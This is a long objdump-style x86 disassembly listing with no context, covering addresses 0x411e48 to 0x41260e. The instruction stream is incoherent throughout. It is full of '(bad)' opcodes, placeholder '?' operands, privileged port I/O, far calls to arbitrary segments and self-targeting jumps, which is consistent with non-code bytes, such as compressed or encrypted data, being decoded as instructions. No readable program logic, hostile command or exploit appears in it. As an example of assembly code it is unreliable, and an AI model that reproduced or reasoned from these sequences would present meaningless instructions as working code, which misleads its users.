  411e48:	xor    BYTE PTR [ecx+0x79],dl
  411e4b:	push   cs
  411e4c:	retf   
  411e4d:	shl    BYTE PTR [eax],cl
  411e4f:	pop    ebx
  411e50:	xchg   BYTE PTR ds:0xca67d2ba,al
  411e56:	arpl   WORD PTR [esp+edx*4-0x712dd86f],bx
  411e5d:	scas   al,BYTE PTR es:[edi]
  411e5e:	adc    eax,0x385c8016
  411e63:	xlat   BYTE PTR ds:[ebx]
  411e64:	or     eax,0x5c4b97fc
  411e69:	in     al,dx
  411e6a:	xchg   BYTE PTR [eax-0x2463a9eb],bl
  411e70:	jmp    0x411e42
  411e72:	test   al,0xab
  411e74:	imul   ebp,DWORD PTR [ebx-0x2b],0xaa351110
  411e7b:	js     0x411e01
  411e7d:	ror    DWORD PTR [esi-0x75],1
  411e80:	cmp    ecx,DWORD PTR [ecx-0x38]
  411e83:	shl    DWORD PTR [ebx],1
  411e85:	inc    ebx
  411e86:	shl    BYTE PTR [ebx+0x74],cl
  411e89:	cli    
  411e8a:	aam    0x5b
  411e8c:	fcom   QWORD PTR [edx]
  411e8e:	mov    bl,0xf9
  411e90:	and    DWORD PTR [ebp-0x49],eax
  411e93:	enter  0xc9d3,0xed
  411e97:	fist   DWORD PTR [edi-0x50f7d030]
  411e9d:	stc    
  411e9e:	pusha  
  411e9f:	adc    ch,ch
  411ea1:	jne    0x411e65
  411ea3:	mov    eax,ds:0xb7e5c8ba
  411ea8:	int3   
  411ea9:	sub    eax,0x4b1b4eb6
  411eae:	and    dh,BYTE PTR [ecx+0x887b4c]
  411eb4:	(bad)  [ebx-0x42]
  411eb7:	iret   
  411eb8:	cmc    
  411eb9:	or     BYTE PTR [esi],ah
  411ebb:	pushf  
  411ebc:	aad    0x9a
  411ebe:	dec    ebp
  411ebf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411ec0:	test   al,0xe2
  411ec2:	sbb    al,0xd4
  411ec4:	mov    ebp,0x1fa9aa8b
  411ec9:	xchg   esp,eax
  411eca:	push   cs
  411ecb:	fdiv   QWORD PTR [edx-0x21]
  411ece:	jmp    0x411eb2
  411ed0:	mov    ebx,0x97af9c00
  411ed5:	cmp    DWORD PTR [ecx-0x29],ebx
  411ed8:	jnp    0x411f39
  411eda:	fwait
  411edb:	fs pop ecx
  411edd:	fistp  QWORD PTR [eax+0x70]
  411ee0:	sahf   
  411ee1:	out    dx,eax
  411ee2:	pop    ebp
  411ee3:	sub    al,0x7b
  411ee5:	in     eax,dx
  411ee6:	push   ds
  411ee7:	inc    eax
  411ee8:	fld    st(7)
  411eea:	xor    al,0xfa
  411eec:	push   ss
  411eed:	in     al,dx
  411eee:	or     eax,DWORD PTR [edx]
  411ef0:	and    ebx,DWORD PTR ds:0x7161f51e
  411ef6:	jmp    0x411ef0
  411ef8:	or     eax,0xe8cbb5f1
  411efd:	adc    BYTE PTR [eax+0x13bd00a5],0x69
  411f04:	mov    bh,BYTE PTR [ebx+ebp*4-0x42]
  411f08:	cmp    edx,eax
  411f0a:	jecxz  0x411f0a
  411f0c:	addr16 mul bh
  411f0f:	shr    al,0x5b
  411f12:	mov    dh,0x3b
  411f14:	xchg   BYTE PTR [ecx+ebp*1+0x74],al
  411f18:	cmovnp esp,DWORD PTR [edi]
  411f1b:	iret   
  411f1c:	addr16 adc ah,al
  411f1f:	and    DWORD PTR [eax+0x4d],ebp
  411f22:	xchg   ah,dh
  411f24:	push   esi
  411f25:	ror    DWORD PTR [esi+0x6c],cl
  411f28:	adc    eax,0xdba27382
  411f2d:	cmp    BYTE PTR [eax-0x773e20cd],0x11
  411f34:	nop
  411f35:	ins    DWORD PTR es:[edi],dx
  411f36:	pop    es
  411f37:	pop    esi
  411f38:	call   0x6e5f:0x83cd9fe1
  411f3f:	jbe    0x411f71
  411f41:	push   0xea6c009f
  411f46:	xor    ch,al
  411f48:	dec    esi
  411f49:	sbb    eax,0x9ab4746d
  411f4e:	sub    edi,DWORD PTR [edi-0x1e1cba5e]
  411f54:	adc    al,0xaa
  411f56:	pop    es
  411f57:	loope  0x411f6a
  411f59:	cmp    esp,DWORD PTR [edi-0x3e]
  411f5c:	sub    DWORD PTR [ebp-0x75],0xfb714878
  411f63:	sti    
  411f64:	mov    cs,ebp
  411f66:	cld    
  411f67:	mov    bl,BYTE PTR [edx]
  411f69:	add    bh,bl
  411f6b:	jbe    0x411f3a
  411f6d:	xor    ah,BYTE PTR [edx-0x4027eb3b]
  411f73:	iret   
  411f74:	neg    ebp
  411f76:	jb     0x411f0a
  411f78:	mov    gs,eax
  411f7a:	mov    edi,0xc0f6dc8d
  411f7f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411f80:	ss pusha 
  411f82:	jne    0x411fae
  411f84:	and    eax,0xc389b351
  411f89:	jmp    0x411fcc
  411f8b:	test   al,0x6
  411f8d:	jmp    0x94c21bc0
  411f92:	push   ebx
  411f93:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411f94:	rcl    BYTE PTR es:[edi-0xb],1
  411f98:	outs   dx,DWORD PTR ds:[esi]
  411f99:	shl    ecx,cl
  411f9b:	sub    DWORD PTR [eax+0xe],eax
  411f9e:	and    al,BYTE PTR [eax+esi*8]
  411fa1:	out    dx,eax
  411fa2:	pop    esp
  411fa3:	loope  0x411feb
  411fa5:	add    BYTE PTR [eax],dl
  411fa7:	mov    ebx,0x8ea40eda
  411fac:	loop   0x411f99
  411fae:	nop
  411faf:	xor    ebp,edi
  411fb1:	loopne 0x411f5b
  411fb3:	add    eax,0xd042970
  411fb8:	jle    0x411fcf
  411fba:	pop    ebx
  411fbb:	test   al,0x0
  411fbd:	or     DWORD PTR [ecx+esi*2+0x6206fded],ecx
  411fc4:	or     al,0xf0
  411fc6:	dec    ebp
  411fc7:	mov    ds:0x40deaa0f,eax
  411fcc:	sar    BYTE PTR [edi-0x15],0x6
  411fd0:	test   eax,0x9eb39eac
  411fd5:	cmp    eax,0xdb9933b6
  411fda:	fcom   DWORD PTR [eax-0x3e]
  411fdd:	imul   ebp,DWORD PTR [edx],0xffffffa9
  411fe0:	fdivrp st(2),st
  411fe2:	sbb    edx,DWORD PTR [ecx]
  411fe4:	mov    dl,0x35
  411fe6:	jbe    0x412061
  411fe8:	xor    al,0x38
  411fea:	das    
  411feb:	and    edi,esi
  411fed:	nop
  411fee:	adc    bl,BYTE PTR [ebx+0x4e2a44f6]
  411ff4:	mov    bh,0x2b
  411ff6:	inc    esp
  411ff7:	add    eax,0x40437e4b
  411ffc:	addr16 (bad) 
  411ffe:	ret    
  411fff:	inc    ecx
  412000:	(bad)  
  412001:	sahf   
  412002:	push   esp
  412003:	retf   
  412004:	or     al,0x79
  412006:	sbb    ebx,DWORD PTR [ecx]
  412008:	xchg   edx,eax
  412009:	xor    edx,DWORD PTR [esp+edi*8-0x7711a8cd]
  412010:	xchg   esp,eax
  412011:	ss or  al,0xe5
  412014:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412015:	call   0xf47:0x551587d3
  41201c:	repnz hlt 
  41201e:	ret    
  41201f:	add    esp,eax
  412021:	xchg   ecx,eax
  412022:	into   
  412023:	push   esi
  412024:	xchg   esp,eax
  412025:	pop    ecx
  412026:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412027:	daa    
  412028:	xchg   DWORD PTR [si],edx
  41202b:	mov    ebp,0xd9690ce
  412030:	fidivr WORD PTR [esi]
  412032:	mov    dl,0x5
  412034:	(bad)  
  412035:	pop    esi
  412036:	iret   
  412037:	adc    BYTE PTR [ecx-0x42],cl
  41203a:	clc    
  41203b:	lods   eax,DWORD PTR ds:[esi]
  41203d:	mov    DWORD PTR [ecx-0x532eb12],0x5387de90
  412047:	aam    0x61
  412049:	pop    ecx
  41204a:	mov    ss,WORD PTR [esi-0x7f]
  41204d:	dec    eax
  41204e:	aad    0x5d
  412050:	neg    edx
  412052:	sti    
  412053:	cli    
  412054:	cmc    
  412055:	dec    eax
  412056:	and    BYTE PTR [ebx],bh
  412058:	loopne 0x412028
  41205a:	adc    DWORD PTR [esi-0x5ab5507e],esi
  412060:	dec    eax
  412061:	and    DWORD PTR [ecx+0x29],ecx
  412064:	mov    al,0xb2
  412066:	push   es
  412067:	popa   
  412068:	mov    BYTE PTR [ebx],0xe8
  41206b:	cmp    esp,DWORD PTR [ecx+0x72259c27]
  412071:	inc    eax
  412072:	sar    BYTE PTR [ebp+ecx*2-0x5ffd69f7],1
  412079:	scas   al,BYTE PTR es:[edi]
  41207a:	rcl    BYTE PTR [eax-0x2a],0xb6
  41207e:	mov    cl,BYTE PTR [edx+0x2fa29613]
  412084:	fld    TBYTE PTR [esi+eax*8-0xc161828]
  41208b:	adc    al,0xd5
  41208d:	repz fwait
  41208f:	sub    bl,BYTE PTR [edx-0x49]
  412092:	clc    
  412093:	jns    0x412054
  412095:	fnstenv [ecx*4-0x3b56ea7c]
  41209c:	jae    0x412093
  41209e:	sbb    DWORD PTR [esp+ecx*2-0x2a],esi
  4120a2:	popf   
  4120a3:	sub    eax,0x5c2cff7a
  4120a8:	test   eax,0x4b27dee5
  4120ad:	adc    DWORD PTR [eax+0x1d9f87e9],esp
  4120b3:	not    BYTE PTR [ecx-0x77]
  4120b6:	push   ds
  4120b7:	mov    al,ds:0xb1147a67
  4120bc:	push   ss
  4120bd:	push   es
  4120be:	mov    ebp,0x9e029e36
  4120c3:	aad    0x23
  4120c5:	sub    BYTE PTR [eax-0x68],al
  4120c8:	pop    ds
  4120c9:	add    BYTE PTR [ebx],0xc6
  4120cc:	cmc    
  4120cd:	scas   al,BYTE PTR es:[edi]
  4120ce:	rol    dh,cl
  4120d0:	mov    dl,0x8e
  4120d2:	xlat   BYTE PTR ds:[ebx]
  4120d3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4120d4:	call   0x658f2963
  4120d9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4120da:	sti    
  4120db:	iret   
  4120dc:	dec    ecx
  4120dd:	in     al,0xd0
  4120df:	sbb    DWORD PTR [edx+0x691e484],ebp
  4120e5:	jge    0x4120a8
  4120e7:	popa   
  4120e8:	in     eax,0x92
  4120ea:	sbb    edi,DWORD PTR [ebp-0x52]
  4120ed:	lds    ebp,FWORD PTR [ebx+0x4912191]
  4120f3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4120f4:	jmp    FWORD PTR [ebp+0x7c]
  4120f7:	std    
  4120f8:	xor    esp,DWORD PTR [edx-0x1c86f5f1]
  4120fe:	out    0xb4,eax
  412100:	adc    BYTE PTR [eax-0xe],cl
  412103:	xor    dl,cl
  412105:	dec    DWORD PTR [ebx-0x67]
  412108:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412109:	rcl    BYTE PTR [ebp+0x108a90f2],cl
  41210f:	push   es
  412110:	inc    edi
  412111:	repz pop es
  412113:	mov    esp,0x5ef8e49
  412118:	sbb    BYTE PTR [edi-0x42],ah
  41211b:	in     eax,dx
  41211c:	and    al,0xf2
  41211e:	fs jns 0x4120b2
  412121:	inc    ecx
  412122:	mov    ds:0x87aefbed,al
  412127:	mov    edi,0x26dac86c
  41212c:	les    ebp,FWORD PTR [edi-0x49a8a3f2]
  412132:	sbb    ecx,DWORD PTR [esi]
  412134:	pop    esp
  412135:	hlt    
  412136:	enter  0xca43,0x85
  41213a:	ss pop ecx
  41213c:	fwait
  41213d:	mov    WORD PTR [ebx],?
  41213f:	cmp    ch,BYTE PTR [esi+0x58616e62]
  412145:	dec    eax
  412146:	rol    DWORD PTR [edx+0x28],0xf8
  41214a:	mov    DWORD PTR [ebp+0x34],0xd2ec0337
  412151:	xlat   BYTE PTR ds:[ebx]
  412152:	jmp    0xadb3166b
  412157:	(bad)  
  412158:	pop    ecx
  412159:	imul   esp,DWORD PTR [esi-0x57],0xd5a0d1c3
  412160:	add    eax,0x688e105
  412165:	or     DWORD PTR [edi-0x17460f5b],ebp
  41216b:	sub    bh,0x63
  41216e:	retf   
  41216f:	sub    BYTE PTR [edi+0x503a24a2],0xeb
  412176:	rcr    BYTE PTR [eax+esi*8-0x6cccb6ba],cl
  41217d:	(bad)  
  41217e:	sbb    eax,0x13e7f652
  412183:	mov    ah,0x3a
  412185:	cdq    
  412186:	outs   dx,DWORD PTR ds:[esi]
  412187:	stos   BYTE PTR es:[edi],al
  412188:	push   eax
  412189:	iret   
  41218a:	sbb    dl,BYTE PTR [edx]
  41218c:	inc    esp
  41218d:	int3   
  41218e:	jo     0x412133
  412190:	retf   
  412191:	push   edi
  412192:	arpl   WORD PTR [edi+0x49822317],ax
  412198:	sbb    al,BYTE PTR [ebx]
  41219a:	push   0xffffffa4
  41219c:	or     BYTE PTR [edx-0x23],0x13
  4121a0:	jle    0x412188
  4121a2:	add    al,0xe3
  4121a4:	aaa    
  4121a5:	mov    ebp,0x500aeac0
  4121aa:	dec    esi
  4121ab:	mov    esp,0xb62b991f
  4121b0:	push   ecx
  4121b1:	and    DWORD PTR [edx],eax
  4121b3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4121b4:	or     dl,BYTE PTR [esi]
  4121b6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4121b7:	ja     0x412177
  4121b9:	(bad)  
  4121ba:	jne    0x41219b
  4121bc:	and    eax,0x5dfc6429
  4121c1:	popf   
  4121c2:	dec    esi
  4121c3:	sub    al,0x54
  4121c5:	dec    esp
  4121c6:	aad    0x68
  4121c8:	stc    
  4121c9:	xchg   ecx,eax
  4121ca:	scas   eax,DWORD PTR es:[edi]
  4121cb:	pop    es
  4121cc:	mov    esi,0xa6735171
  4121d1:	push   0xe9042282
  4121d6:	in     eax,0x80
  4121d8:	dec    esi
  4121d9:	sbb    BYTE PTR [ebp-0xb],dl
  4121dc:	cld    
  4121dd:	clc    
  4121de:	iret   
  4121df:	sbb    ebx,edx
  4121e1:	push   0x8a40e107
  4121e6:	cmp    BYTE PTR [eax+ebx*2+0x47],cl
  4121ea:	leave  
  4121eb:	ss scas al,BYTE PTR es:[di]
  4121ee:	dec    edi
  4121ef:	das    
  4121f0:	mov    cs,WORD PTR [eax+0x48948297]
  4121f6:	mov    bl,al
  4121f8:	pop    ss
  4121f9:	inc    esp
  4121fa:	and    ebx,DWORD PTR [ecx-0x55]
  4121fd:	fnstenv [esi]
  4121ff:	mov    esi,0x6d50d967
  412204:	inc    edx
  412205:	shl    edi,0x97
  412208:	xchg   BYTE PTR [esi-0x79ddd56e],bl
  41220e:	mov    ah,0x78
  412210:	mov    al,0x4c
  412212:	pop    esp
  412213:	(bad)  
  412214:	adc    eax,0x8a767482
  412219:	dec    ecx
  41221a:	adc    BYTE PTR [ecx*2+0x56051b3e],0x4f
  412222:	jg     0x4121d7
  412224:	cld    
  412225:	xchg   edi,eax
  412226:	popa   
  412227:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412228:	mov    bl,BYTE PTR [edi+eiz*4-0x114c21e3]
  41222f:	push   ebx
  412230:	aaa    
  412231:	and    BYTE PTR [edx-0x7782997d],al
  412237:	xchg   edi,eax
  412238:	js     0x412293
  41223a:	call   FWORD PTR [ebp+0xdef092c]
  412240:	or     eax,0x8d194d08
  412245:	push   cs
  412246:	call   0xc0ce77e2
  41224b:	pop    esp
  41224c:	push   ss
  41224d:	out    0x68,al
  41224f:	sub    al,BYTE PTR [edi-0x4fa32d28]
  412255:	mov    ebx,0xe7e42441
  41225a:	fld    TBYTE PTR [ebx+0x7]
  41225d:	sbb    al,0xf6
  41225f:	fwait
  412260:	std    
  412261:	pop    esp
  412262:	test   DWORD PTR [ecx+0x790ff288],edx
  412268:	out    dx,eax
  412269:	pop    esi
  41226a:	push   0xffffffc8
  41226c:	mov    ecx,0xbd3d0457
  412271:	shr    BYTE PTR [ebx-0x35],0x59
  412275:	mov    ebp,0x97510147
  41227a:	push   0x1b
  41227c:	sbb    DWORD PTR [ebx-0x80],esi
  41227f:	dec    esi
  412280:	jmp    0x4e26:0x37c3f139
  412287:	popa   
  412288:	sub    al,0xc9
  41228a:	shl    ebp,1
  41228c:	jmp    0x67d5:0x8307a4af
  412293:	cmp    ah,0x8
  412296:	mov    BYTE PTR [eax],dl
  412298:	adc    DWORD PTR [edx+0x49],ecx
  41229b:	scas   al,BYTE PTR es:[edi]
  41229c:	push   edi
  41229d:	fadd   QWORD PTR [ecx-0x33a264ff]
  4122a3:	jb     0x41230e
  4122a5:	std    
  4122a6:	idiv   BYTE PTR [eax]
  4122a8:	mov    dh,0xec
  4122aa:	jno    0x412291
  4122ac:	ret    
  4122ad:	lahf   
  4122ae:	push   ebx
  4122af:	xchg   DWORD PTR [edi],eax
  4122b1:	jle    0x4122d3
  4122b3:	shl    DWORD PTR [esi+ebp*8-0x7586964b],0xd1
  4122bb:	push   eax
  4122bc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4122bd:	sbb    al,dh
  4122bf:	add    ebx,ecx
  4122c1:	lds    edi,FWORD PTR [edi-0x57]
  4122c4:	jae    0x4122be
  4122c6:	out    dx,eax
  4122c7:	or     DWORD PTR [edx+0xb401e64],edx
  4122cd:	mov    edi,0x24b4a514
  4122d2:	jae    0x4122c4
  4122d4:	nop
  4122d5:	dec    eax
  4122d6:	mov    bl,0x11
  4122d8:	aad    0x87
  4122da:	inc    eax
  4122db:	cmovl  eax,DWORD PTR [ebp+0x27]
  4122df:	inc    ebp
  4122e0:	pop    esi
  4122e1:	xchg   esi,eax
  4122e2:	addr16 mov ch,0x7c
  4122e5:	sbb    DWORD PTR [edx+eiz*8+0x6b],eax
  4122e9:	enter  0x7d4a,0x81
  4122ed:	les    eax,FWORD PTR [ebx]
  4122ef:	jo     0x4122eb
  4122f1:	fs jge 0x41231b
  4122f4:	pusha  
  4122f5:	test   ecx,edx
  4122f7:	pop    edx
  4122f8:	ss jo  0x412326
  4122fb:	mov    BYTE PTR [ebx+0x2d],ah
  4122fe:	xlat   BYTE PTR ds:[ebx]
  4122ff:	xchg   DWORD PTR [ebx-0x49b5dd33],edx
  412305:	imul   eax,edx,0x8781811c
  41230b:	aam    0xc
  41230d:	test   al,0xdc
  41230f:	jmp    0x6a4982cc
  412314:	nop    DWORD PTR [edi+0x47]
  412318:	pop    ebx
  412319:	ror    dh,1
  41231b:	retf   
  41231c:	adc    bl,BYTE PTR [esi+0x4f37a047]
  412322:	sbb    WORD PTR [eax],0xd6a5
  412327:	xchg   DWORD PTR [eax+0x16],edx
  41232a:	adc    eax,0x4f6c5877
  41232f:	fxtract 
  412331:	xor    esp,DWORD PTR ds:[edx]
  412334:	(bad)  
  412335:	cli    
  412336:	repz push esi
  412338:	loopne 0x4123b4
  41233a:	inc    eax
  41233b:	and    al,0x9a
  41233d:	fwait
  41233e:	dec    ecx
  41233f:	dec    edx
  412340:	outs   dx,DWORD PTR ds:[esi]
  412341:	xchg   edi,eax
  412342:	sbb    al,0xe8
  412344:	mov    DWORD PTR [eax-0x7b],ebp
  412347:	sar    BYTE PTR [ebp-0x7],cl
  41234a:	jecxz  0x412323
  41234c:	aas    
  41234d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41234e:	out    0x73,eax
  412350:	xlat   BYTE PTR ds:[ebx]
  412351:	lods   al,BYTE PTR ds:[esi]
  412352:	sbb    bl,ah
  412354:	aad    0x8b
  412356:	cs sub eax,0xa46cd184
  41235c:	call   0x792c:0x933b8c98
  412363:	sub    eax,0x6dcff417
  412368:	outs   dx,BYTE PTR ds:[esi]
  412369:	loopne 0x4123a5
  41236b:	sub    DWORD PTR [edi],0xeddcc8aa
  412371:	add    eax,0x99089e25
  412376:	lods   eax,DWORD PTR ds:[esi]
  412377:	and    DWORD PTR [esi+0x76],ebp
  41237a:	inc    edx
  41237b:	pushf  
  41237c:	pop    es
  41237d:	idiv   esp
  41237f:	dec    ecx
  412380:	dec    ebp
  412381:	test   BYTE PTR [eax+edx*4],al
  412384:	nop
  412385:	ja     0x41236e
  412387:	mov    cl,BYTE PTR [esi+0x725613b]
  41238d:	stc    
  41238e:	ds inc edx
  412390:	adc    al,0x4c
  412392:	jmp    0x4123f6
  412394:	or     esp,ebx
  412396:	mov    DWORD PTR [ebp-0xd],eax
  412399:	adc    eax,0x3e5208b5
  41239e:	call   0xc8f0:0xcaed9d61
  4123a5:	test   BYTE PTR [edx-0x3c],0xb0
  4123a9:	jecxz  0x4123fc
  4123ab:	mov    esp,?
  4123ad:	sbb    dl,BYTE PTR [ecx+0x22]
  4123b0:	daa    
  4123b1:	and    edx,edx
  4123b3:	pop    ebx
  4123b4:	pop    ebp
  4123b5:	push   0x2
  4123b7:	cmp    ecx,DWORD PTR [ecx]
  4123b9:	mov    al,0x47
  4123bb:	push   ecx
  4123bc:	mov    ebp,0x347be9bf
  4123c1:	jb     0x4123a0
  4123c3:	sub    eax,0xf39dccf1
  4123c8:	cli    
  4123c9:	push   eax
  4123ca:	xor    al,0xf2
  4123cc:	ins    DWORD PTR es:[edi],dx
  4123cd:	mov    cl,0x36
  4123cf:	cmp    al,0x8b
  4123d1:	rcr    BYTE PTR [ebx+ebp*8-0x73],0xbc
  4123d6:	cld    
  4123d7:	and    DWORD PTR ds:[ecx+0x7],edx
  4123db:	pushf  
  4123dc:	(bad)  
  4123dd:	dec    edx
  4123de:	cmp    al,0x65
  4123e1:	ss push 0xffffffab
  4123e4:	mov    ecx,0x5f7f1b36
  4123e9:	shl    BYTE PTR ds:0x1a646c6e,1
  4123ef:	data16 add ah,ah
  4123f2:	and    ah,ah
  4123f4:	mov    edi,0x11d951
  4123f9:	div    DWORD PTR ds:0x99f2034d
  4123ff:	mov    esi,0xac58b30e
  412404:	add    edi,DWORD PTR [edx]
  412406:	daa    
  412407:	add    BYTE PTR [ecx-0x27],bl
  41240a:	(bad)  
  41240b:	mov    bh,0x7d
  41240d:	xlat   BYTE PTR ds:[ebx]
  41240e:	dec    eax
  41240f:	(bad)  
  412410:	mov    bl,0x46
  412412:	or     al,0x8c
  412414:	scas   eax,DWORD PTR es:[edi]
  412415:	adc    BYTE PTR ds:0xc7db197b,al
  41241b:	push   ds
  41241c:	inc    eax
  41241d:	sub    eax,0x1af5884e
  412422:	dec    esi
  412423:	add    al,0xbc
  412425:	jp     0x4123e1
  412427:	push   sp
  412429:	ror    BYTE PTR [esi-0x78c70faf],1
  41242f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412430:	outs   dx,DWORD PTR ds:[esi]
  412431:	popf   
  412432:	movd   mm5,DWORD PTR [eax]
  412435:	adc    al,0xb9
  412437:	bound  ebp,QWORD PTR [ebx+0x60]
  41243a:	adc    eax,0x943f38fc
  41243f:	push   es
  412440:	or     ecx,ecx
  412442:	jns    0x4123e2
  412444:	xchg   ecx,eax
  412445:	out    dx,al
  412446:	cdq    
  412447:	ja     0x4124a4
  412449:	mov    es,WORD PTR [esp+ecx*2]
  41244c:	sbb    eax,0x1c6dc512
  412451:	and    eax,0xa0aa0867
  412456:	ja     0x4124a8
  412458:	sbb    eax,0x6eb1e62b
  41245d:	cmp    DWORD PTR [eax-0x48f6d150],eax
  412463:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412464:	and    BYTE PTR [edi+0x30],ch
  412467:	out    0x8e,al
  412469:	mov    ds:0xf120d5e3,eax
  41246e:	jbe    0x41247c
  412470:	sbb    ch,dl
  412472:	cdq    
  412473:	call   0x3f4eb2c7
  412478:	cmp    ebx,DWORD PTR [ebp+edx*2-0x5f]
  41247c:	ss inc edi
  41247e:	daa    
  41247f:	sbb    al,0x8c
  412481:	dec    edi
  412482:	mov    DWORD PTR [edi-0x6d7f7ac0],ecx
  412488:	push   ecx
  412489:	adc    eax,0x2c0d2ab5
  41248e:	dec    eax
  41248f:	int3   
  412490:	cmp    DWORD PTR [ecx-0x7b],edi
  412493:	or     BYTE PTR [ebx+0x5028a407],bh
  412499:	cmp    BYTE PTR [esi-0x2524eda3],dh
  41249f:	gs (bad) 
  4124a1:	push   ebp
  4124a2:	das    
  4124a3:	xchg   BYTE PTR [eax-0x6a6d2444],bl
  4124a9:	dec    esp
  4124aa:	sub    eax,0x74361b2c
  4124af:	mov    al,0x88
  4124b1:	gs daa 
  4124b3:	mov    dh,0x66
  4124b5:	xor    eax,0xfae92654
  4124ba:	sub    ebp,esp
  4124bc:	inc    eax
  4124bd:	xchg   BYTE PTR [edx-0xe],dh
  4124c0:	mov    bl,0x80
  4124c2:	jns    0x41249e
  4124c4:	inc    ecx
  4124c5:	add    eax,0xbad53262
  4124ca:	sbb    DWORD PTR [esi],eax
  4124cc:	in     al,0xad
  4124ce:	mov    ch,0xd2
  4124d0:	(bad)  
  4124d1:	or     DWORD PTR [esi+edi*8+0x4530babf],ebx
  4124d8:	dec    esp
  4124d9:	mov    BYTE PTR [esi-0x3f5bde11],cl
  4124df:	add    ecx,DWORD PTR [ebx+0x32ad8ad]
  4124e5:	add    DWORD PTR [ebx-0x1a],esp
  4124e8:	arpl   WORD PTR [edx],bx
  4124ea:	jb     0x41255a
  4124ec:	ins    DWORD PTR es:[edi],dx
  4124ed:	push   ss
  4124ee:	xchg   esi,eax
  4124ef:	sahf   
  4124f0:	retf   
  4124f1:	iret   
  4124f2:	stos   DWORD PTR es:[edi],eax
  4124f3:	jo     0x4124f3
  4124f5:	repz fnstsw WORD PTR [edi+0x41]
  4124f9:	xchg   edi,eax
  4124fa:	xchg   edi,eax
  4124fb:	fs pop ebx
  4124fd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4124fe:	adc    eax,0x6b7e22d8
  412503:	rcl    esi,1
  412505:	ret    
  412506:	fcmovnu st,st(5)
  412508:	xchg   esi,eax
  412509:	xor    al,0x48
  41250b:	sti    
  41250c:	add    ah,cl
  41250e:	fwait
  41250f:	popf   
  412510:	lds    ecx,FWORD PTR [edi]
  412512:	popa   
  412513:	rcr    DWORD PTR [ecx+0x37],cl
  412516:	sub    DWORD PTR [ebx],esp
  412518:	clc    
  412519:	inc    edx
  41251a:	mov    dh,0x15
  41251c:	add    al,BYTE PTR [edx+ecx*8]
  41251f:	je     0x412558
  412521:	int    0xd6
  412523:	push   ss
  412524:	mov    ecx,0x713329c9
  412529:	es sub bl,dl
  41252c:	data16 hlt 
  41252e:	pop    edx
  41252f:	test   BYTE PTR [ebx+0x17],dl
  412532:	sub    DWORD PTR ss:0x7901a863,esp
  412539:	mov    dl,0xa8
  41253b:	out    0x8f,al
  41253d:	mov    ecx,0xd9052d2
  412542:	cmp    ebp,edx
  412544:	xchg   edi,eax
  412545:	iret   
  412546:	xchg   esi,eax
  412547:	jbe    0x4125a5
  412549:	pop    ebp
  41254a:	aaa    
  41254b:	loop   0x412578
  41254d:	pop    ecx
  41254e:	std    
  41254f:	test   edi,edi
  412551:	jb     0x41253c
  412553:	not    BYTE PTR [ebx+0xe]
  412556:	mov    bl,0x3e
  412558:	dec    eax
  412559:	in     eax,0xda
  41255b:	int    0xde
  41255d:	call   0xf2f7abea
  412562:	ds inc edx
  412564:	popf   
  412565:	imul   edx,DWORD PTR [ebp+0x30],0x32
  412569:	mov    ebp,0x54da7a04
  41256e:	fcmovnu st,st(6)
  412570:	lock push ds
  412572:	sbb    BYTE PTR [edi],ah
  412574:	outs   dx,DWORD PTR ss:[esi]
  412576:	or     ah,BYTE PTR [edx]
  412578:	dec    esp
  412579:	push   ebx
  41257a:	ds in  eax,dx
  41257c:	push   ecx
  41257d:	cmc    
  41257e:	push   ss
  41257f:	jno    0x41254b
  412581:	es stos DWORD PTR es:[edi],eax
  412583:	and    bh,BYTE PTR [esi+0x67e9823a]
  412589:	cmp    eax,0xf91f2442
  41258e:	fild   QWORD PTR [ebp+0x47]
  412591:	jg     0x412553
  412593:	sub    ebx,ebp
  412595:	jb     0x4125be
  412597:	jl     0x4125bb
  412599:	lods   eax,DWORD PTR ds:[esi]
  41259a:	adc    bl,BYTE PTR [edx+0x376ff933]
  4125a0:	ror    dl,cl
  4125a2:	xchg   eax,edx
  4125a4:	push   ss
  4125a5:	scas   al,BYTE PTR es:[edi]
  4125a6:	xor    al,0x9e
  4125a8:	fs push esi
  4125aa:	push   0x3d
  4125ac:	inc    ecx
  4125ad:	out    dx,eax
  4125ae:	test   BYTE PTR [edx+eax*1+0x9],cl
  4125b2:	mov    ebx,0x35b3b393
  4125b7:	out    dx,eax
  4125b8:	je     0x412577
  4125ba:	cli    
  4125bb:	mov    esi,0xd1f2e536
  4125c0:	js     0x4125ba
  4125c2:	add    eax,0x34ec1101
  4125c7:	inc    ebp
  4125c8:	mov    ebp,0xdaea746b
  4125cd:	add    DWORD PTR [edx],ebx
  4125cf:	mov    edx,ds
  4125d1:	and    dl,BYTE PTR [edi+0x21]
  4125d4:	cmc    
  4125d5:	ja     0x4125f9
  4125d7:	repz (bad) 
  4125d9:	and    eax,0x16308577
  4125de:	imul   DWORD PTR [eax+0x5ff5417b]
  4125e4:	clc    
  4125e5:	ja     0x4125ea
  4125e7:	neg    BYTE PTR [ebx-0x224c28d0]
  4125ed:	mov    dh,0xfc
  4125ef:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4125f0:	idiv   DWORD PTR [eax-0x5a905987]
  4125f6:	test   DWORD PTR [eax+0x37ca3238],ebx
  4125fc:	lods   al,BYTE PTR ds:[esi]
  4125fd:	xchg   ebp,eax
  4125fe:	(bad)  
  4125ff:	aam    0xa0
  412601:	sti    
  412602:	mov    DWORD PTR [edx],ebp
  412604:	loope  0x412668
  412606:	or     dh,ch
  412608:	pop    edx
  412609:	dec    ebp
  41260a:	inc    ecx
  41260b:	xchg   DWORD PTR [esi+0x54],ebx
  41260e:	xor    al,0xa4
